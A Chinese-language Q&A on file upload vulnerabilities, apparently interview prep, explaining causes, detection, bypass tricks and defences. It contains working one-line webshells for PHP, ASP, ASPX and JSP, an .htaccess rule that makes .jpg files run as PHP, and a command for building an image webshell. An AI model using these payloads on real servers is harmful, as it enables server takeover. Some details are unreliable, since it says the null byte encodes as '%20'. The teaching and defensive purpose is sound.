<h3 class="md-end-block md-heading"><span class="md-plain">1. 文件上传漏洞的原理是什么？</span></h3>
<p class="md-end-block md-p md-focus"><span class="md-plain">文件上传漏洞是指网站允许用户上传文件时，因未对上传文件的类型、内容、路径等进行严格验证和控制，导致恶意文件（如 Webshell）被成功上传至服务器，且能被服务器解析执行，从而被攻击者利用以获取服务器权限的漏洞。</span></p>

<h3 class="md-end-block md-heading"><span class="md-plain">2. 文件上传漏洞产生的原因是什么？</span></h3>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">验证逻辑缺陷：仅依赖前端验证（可被绕过）、仅校验文件扩展名或 MIME 类型（易篡改）；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">文件处理不当：上传路径可控（攻击者可指定路径）、未对文件重命名（保留恶意文件名）；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">服务器配置问题：存在文件解析漏洞（如 Apache 的.htaccess 解析、IIS 的目录解析）、上传目录权限过高（可执行）；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">开发疏忽：未过滤文件内容（如未检测图片马中的恶意代码）、未限制文件大小（导致 DOS 攻击）。</span></p>
</li>
</ul>
<h3 class="md-end-block md-heading"><span class="md-plain">3. 文件上传漏洞的危害有哪些？</span></h3>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">攻击者可上传 Webshell，直接获取服务器操作权限（执行命令、读写文件）；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">窃取服务器敏感数据（数据库信息、用户数据、配置文件）；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">篡改网站内容（挂马、植入广告、删除页面）；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">利用服务器作为跳板，进一步渗透内网；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">导致服务器被纳入僵尸网络，参与 DDOS 攻击等。</span></p>
</li>
</ul>
<h3 class="md-end-block md-heading"><span class="md-plain">4. 什么是 Webshell？（含介绍）</span></h3>
<p class="md-end-block md-p"><span class="md-plain">Webshell 是一种通过 Web 接口控制服务器的恶意脚本，通常体积小、隐蔽性强，可被攻击者用于远程操控服务器。</span></p>

<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">作用：执行系统命令、读写文件、数据库操作、内网渗透等；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">分类：按功能可分为 “一句话木马”（极简，依赖客户端连接）和 “大马”（功能齐全，含管理界面）；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">特点：通过 HTTP/HTTPS 协议与攻击者交互，无需直接登录服务器，隐蔽性高。</span></p>
</li>
</ul>
<h3 class="md-end-block md-heading"><span class="md-plain">5. 常见的一句话木马有哪些？</span></h3>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">PHP</span></strong></span><span class="md-plain">：</span><span class="md-pair-s" spellcheck="false"><code>&lt;?php @eval($_POST[&#039;cmd&#039;]);?&gt;</code></span><span class="md-plain">（通过 POST 参数</span><span class="md-pair-s" spellcheck="false"><code>cmd</code></span><span class="md-plain">执行命令）</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">ASP</span></strong></span><span class="md-plain">：</span><span class="md-pair-s" spellcheck="false"><code>&lt;%eval request(&quot;cmd&quot;)%&gt;</code></span><span class="md-plain">（通过</span><span class="md-pair-s" spellcheck="false"><code>request</code></span><span class="md-plain">获取参数执行）</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">ASPX</span></strong></span><span class="md-plain">：</span><span class="md-pair-s" spellcheck="false"><code>&lt;%@ Page Language=&quot;C#&quot; %&gt;&lt;%Response.Write(System.Diagnostics.Process.Start(Request[&quot;cmd&quot;]).StandardOutput.ReadToEnd());%&gt;</code></span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">JSP</span></strong></span><span class="md-plain">：</span><span class="md-pair-s" spellcheck="false"><code>&lt;% Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;)); %&gt;</code></span></p>
</li>
</ul>
<h3 class="md-end-block md-heading"><span class="md-plain">6. PHP 中的 $_FILES 函数详解</span></h3>
<p class="md-end-block md-p"><span class="md-pair-s" spellcheck="false"><code>$_FILES</code></span><span class="md-plain"> 是 PHP 的超级全局变量，用于获取客户端上传文件的信息，结构为二维数组（假设表单上传字段名为</span><span class="md-pair-s" spellcheck="false"><code>file</code></span><span class="md-plain">）：</span></p>

<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s" spellcheck="false"><code>$_FILES[&#039;file&#039;][&#039;name&#039;]</code></span><span class="md-plain">：客户端上传的原始文件名（含扩展名）；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s" spellcheck="false"><code>$_FILES[&#039;file&#039;][&#039;type&#039;]</code></span><span class="md-plain">：客户端提交的 MIME 类型（如</span><span class="md-pair-s" spellcheck="false"><code>image/jpeg</code></span><span class="md-plain">，可被篡改）；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s" spellcheck="false"><code>$_FILES[&#039;file&#039;][&#039;tmp_name&#039;]</code></span><span class="md-plain">：文件上传至服务器后的临时存储路径（需通过</span><span class="md-pair-s" spellcheck="false"><code>move_uploaded_file()</code></span><span class="md-plain">移动）；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s" spellcheck="false"><code>$_FILES[&#039;file&#039;][&#039;error&#039;]</code></span><span class="md-plain">：上传错误代码（0 = 成功，1 = 超 php.ini 大小限制，2 = 超表单大小限制，3 = 文件部分上传，4 = 无文件上传，6 = 临时目录缺失，7 = 写入失败）；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s" spellcheck="false"><code>$_FILES[&#039;file&#039;][&#039;size&#039;]</code></span><span class="md-plain">：上传文件的字节大小。</span></p>
</li>
</ul>
<h3 class="md-end-block md-heading"><span class="md-plain">7. 你会如何检测文件上传漏洞？</span></h3>
<ol class="ol-list" start="">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">信息收集：确定上传点（如表单、API）、查看页面源码获取验证逻辑（前端 JS）；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">功能测试：上传合法文件（验证是否正常存储）、上传恶意文件（观察是否被拦截）；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">绕过尝试：针对扩展名、MIME、内容的验证逻辑，分别用大小写、特殊后缀、图片马等测试；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">服务器配置检测：测试是否存在解析漏洞（如上传</span><span class="md-pair-s" spellcheck="false"><code>.htaccess</code></span><span class="md-plain">配合图片马）；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">工具辅助：用 Burp Suite 抓包修改参数（如文件名、Content-Type），用漏洞扫描工具（如 AWVS）辅助检测。</span></p>
</li>
</ol>
<h3 class="md-end-block md-heading"><span class="md-plain">8. 文件上传的绕过方式有哪些？（含姿势）</span></h3>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">前端验证绕过</span></strong></span><span class="md-plain">：禁用浏览器 JS、删除表单</span><span class="md-pair-s" spellcheck="false"><code>onchange</code></span><span class="md-plain">验证事件、修改</span><span class="md-pair-s" spellcheck="false"><code>accept</code></span><span class="md-plain">属性允许所有类型；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">扩展名绕过</span></strong></span><span class="md-plain">：</span></p>

<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">大小写：</span><span class="md-pair-s" spellcheck="false"><code>.Php</code></span><span class="md-plain">、</span><span class="md-pair-s" spellcheck="false"><code>.Jpg</code></span><span class="md-plain">（服务器大小写不敏感时）；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">特殊后缀：</span><span class="md-pair-s" spellcheck="false"><code>.php5</code></span><span class="md-plain">、</span><span class="md-pair-s" spellcheck="false"><code>.phtml</code></span><span class="md-plain">（若服务器支持 PHP 解析）；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">双写：</span><span class="md-pair-s" spellcheck="false"><code>.pphphp</code></span><span class="md-plain">（过滤</span><span class="md-pair-s" spellcheck="false"><code>php</code></span><span class="md-plain">时被替换为</span><span class="md-pair-s" spellcheck="false"><code>php</code></span><span class="md-plain">）；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">空格 / 点：</span><span class="md-pair-s" spellcheck="false"><code>shell.php.</code></span><span class="md-plain">、</span><span class="md-pair-s" spellcheck="false"><code>shell.php </code></span><span class="md-plain">（Windows 下会忽略末尾空格 / 点）；</span></p>
</li>
</ul>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">MIME 类型绕过</span></strong></span><span class="md-plain">：抓包修改</span><span class="md-pair-s" spellcheck="false"><code>Content-Type</code></span><span class="md-plain">为</span><span class="md-pair-s" spellcheck="false"><code>image/jpeg</code></span><span class="md-plain">（对应图片）、</span><span class="md-pair-s" spellcheck="false"><code>application/pdf</code></span><span class="md-plain">（对应 PDF）；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">内容验证绕过</span></strong></span><span class="md-plain">：制作图片马（保留图片头</span><span class="md-pair-s" spellcheck="false"><code>FFD8FF</code></span><span class="md-plain">）、伪造文件头（如在脚本前加</span><span class="md-pair-s" spellcheck="false"><code>GIF89a</code></span><span class="md-plain">）；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">路径绕过</span></strong></span><span class="md-plain">：00 截断（</span><span class="md-pair-s" spellcheck="false"><code>shell.php%00.jpg</code></span><span class="md-plain">，PHP 需</span><span class="md-pair-s" spellcheck="false"><code>magic_quotes_gpc=Off</code></span><span class="md-plain">）、路径穿越（</span><span class="md-pair-s" spellcheck="false"><code>../shell.php</code></span><span class="md-plain">）；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">条件竞争</span></strong></span><span class="md-plain">：利用服务器先存储后验证的逻辑，在删除前访问临时文件执行命令。</span></p>
</li>
</ul>
<h3 class="md-end-block md-heading"><span class="md-plain">9. 什么是 00 截断？如何利用它绕过扩展名检测？</span></h3>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">00 截断</span></strong></span><span class="md-plain">：指 ASCII 码中的</span><span class="md-pair-s" spellcheck="false"><code>0x00</code></span><span class="md-plain">字符，在 C 语言等字符串处理中被视为 “结束符”。若服务器用此类语言处理文件名，会忽略</span><span class="md-pair-s" spellcheck="false"><code>0x00</code></span><span class="md-plain">后的内容。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">利用方式</span></strong></span><span class="md-plain">：若服务器限制 “仅允许.jpg”，则构造文件名</span><span class="md-pair-s" spellcheck="false"><code>shell.php%00.jpg</code></span><span class="md-plain">（URL 编码为</span><span class="md-pair-s" spellcheck="false"><code>shell.php%20.jpg</code></span><span class="md-plain">），服务器解析时会将</span><span class="md-pair-s" spellcheck="false"><code>%00</code></span><span class="md-plain">当作结束符，实际保存为</span><span class="md-pair-s" spellcheck="false"><code>shell.php</code></span><span class="md-plain">，从而绕过</span><span class="md-pair-s" spellcheck="false"><code>.jpg</code></span><span class="md-plain">限制。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">注意：需满足服务器环境（如 PHP < 5.3.4，且</span><span class="md-pair-s" spellcheck="false"><code>magic_quotes_gpc=Off</code></span><span class="md-plain">）。</span></p>
</li>
</ul>
<h3 class="md-end-block md-heading"><span class="md-plain">10. 文件上传漏洞：如何绕过 “仅允许.jpg 文件” 的限制？</span></h3>
<ol class="ol-list" start="">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">扩展名绕过</span></strong></span><span class="md-plain">：用</span><span class="md-pair-s" spellcheck="false"><code>.JPG</code></span><span class="md-plain">（大小写）、</span><span class="md-pair-s" spellcheck="false"><code>shell.jpg.php</code></span><span class="md-plain">（若仅校验末尾扩展名，需配合解析漏洞）；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">00 截断</span></strong></span><span class="md-plain">：上传</span><span class="md-pair-s" spellcheck="false"><code>shell.php%00.jpg</code></span><span class="md-plain">，服务器解析为</span><span class="md-pair-s" spellcheck="false"><code>shell.php</code></span><span class="md-plain">；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">MIME 绕过</span></strong></span><span class="md-plain">：抓包将</span><span class="md-pair-s" spellcheck="false"><code>Content-Type</code></span><span class="md-plain">改为</span><span class="md-pair-s" spellcheck="false"><code>image/jpeg</code></span><span class="md-plain">；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">内容绕过</span></strong></span><span class="md-plain">：制作图片马（含</span><span class="md-pair-s" spellcheck="false"><code>FFD8FF</code></span><span class="md-plain">图片头），上传后通过文件包含调用；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">前端绕过</span></strong></span><span class="md-plain">：删除表单中限制</span><span class="md-pair-s" spellcheck="false"><code>.jpg</code></span><span class="md-plain">的 JS 验证逻辑；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">特殊后缀</span></strong></span><span class="md-plain">：若服务器支持，上传</span><span class="md-pair-s" spellcheck="false"><code>shell.jpg.php5</code></span><span class="md-plain">（解析为 PHP）。</span></p>
</li>
</ol>
<h3 class="md-end-block md-heading"><span class="md-plain">11. 目标站无防护，上传图片可以正常访问，上传脚本格式访问则 403，如何处理？</span></h3>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">推测服务器对脚本文件（如</span><span class="md-pair-s" spellcheck="false"><code>.php</code></span><span class="md-plain">）设置了访问限制（如</span><span class="md-pair-s" spellcheck="false"><code>mod_rewrite</code></span><span class="md-plain">规则）；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">解决方案：</span></p>

<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">上传特殊后缀脚本（如</span><span class="md-pair-s" spellcheck="false"><code>.php5</code></span><span class="md-plain">、</span><span class="md-pair-s" spellcheck="false"><code>.phtml</code></span><span class="md-plain">，若服务器支持解析）；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">利用解析漏洞：上传</span><span class="md-pair-s" spellcheck="false"><code>.htaccess</code></span><span class="md-plain">文件（内容</span><span class="md-pair-s" spellcheck="false"><code>AddType application/x-httpd-php .jpg</code></span><span class="md-plain">），使</span><span class="md-pair-s" spellcheck="false"><code>.jpg</code></span><span class="md-plain">被解析为 PHP，再上传图片马；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">结合文件包含漏洞：上传图片马，通过</span><span class="md-pair-s" spellcheck="false"><code>?file=图片马路径</code></span><span class="md-plain">调用执行。</span></p>
</li>
</ul>
</li>
</ul>
<h3 class="md-end-block md-heading"><span class="md-plain">12. 如何制作图片码？</span></h3>
<p class="md-end-block md-p"><span class="md-plain">图片码（图片马）是包含恶意脚本的图片文件，制作步骤：</span></p>

<ol class="ol-list" start="">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">准备一张正常图片（如</span><span class="md-pair-s" spellcheck="false"><code>1.jpg</code></span><span class="md-plain">）和一句话木马（如</span><span class="md-pair-s" spellcheck="false"><code>shell.php</code></span><span class="md-plain">，内容</span><span class="md-pair-s" spellcheck="false"><code>&lt;?php @eval($_POST[&#039;cmd&#039;]);?&gt;</code></span><span class="md-plain">）；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">在 Windows 命令行执行：</span><span class="md-pair-s" spellcheck="false"><code>copy /b 1.jpg + shell.php webshell.jpg</code></span><span class="md-plain">（</span><span class="md-pair-s" spellcheck="false"><code>/b</code></span><span class="md-plain">表示二进制合并）；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">验证：用文本编辑器打开</span><span class="md-pair-s" spellcheck="false"><code>webshell.jpg</code></span><span class="md-plain">，尾部可见</span><span class="md-pair-s" spellcheck="false"><code>shell.php</code></span><span class="md-plain">内容，且能正常显示为图片；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">用途：上传后通过文件包含或服务器解析漏洞执行脚本。</span></p>
</li>
</ol>
<h3 class="md-end-block md-heading"><span class="md-plain">13. 文件上传漏洞的防护措施有哪些？</span></h3>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">验证层面</span></strong></span><span class="md-plain">：</span></p>

<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">前端 + 后端双重验证（前端仅作提示，后端严格校验）；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">校验文件内容（如图片用</span><span class="md-pair-s" spellcheck="false"><code>getimagesize()</code></span><span class="md-plain">检查宽高，或校验文件头</span><span class="md-pair-s" spellcheck="false"><code>FFD8FF</code></span><span class="md-plain">）；</span></p>
</li>
</ul>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">文件处理</span></strong></span><span class="md-plain">：</span></p>

<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">重命名文件（用随机字符串 + 时间戳，如</span><span class="md-pair-s" spellcheck="false"><code>a1b2c3.jpg</code></span><span class="md-plain">，避免路径可控）；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">限制文件大小（结合</span><span class="md-pair-s" spellcheck="false"><code>php.ini</code></span><span class="md-plain">和业务需求）；</span></p>
</li>
</ul>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">服务器配置</span></strong></span><span class="md-plain">：</span></p>

<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">上传目录设置为不可执行（如</span><span class="md-pair-s" spellcheck="false"><code>chmod 644</code></span><span class="md-plain">）；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">关闭不必要的解析（如 Apache 禁用</span><span class="md-pair-s" spellcheck="false"><code>.htaccess</code></span><span class="md-plain">，IIS 关闭目录解析）；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">上传文件存储在非 Web 根目录或独立域名；</span></p>
</li>
</ul>
</li>
 	<li class="md-list-item md-focus-container">
<p class="md-end-block md-p md-focus"><span class="md-pair-s "><strong><span class="md-plain">其他</span></strong></span><span class="md-plain md-expand">：日志审计（记录上传行为）、使用云存储（如 OSS，避免本地存储风险）。</span></p>
</li>
</ul>
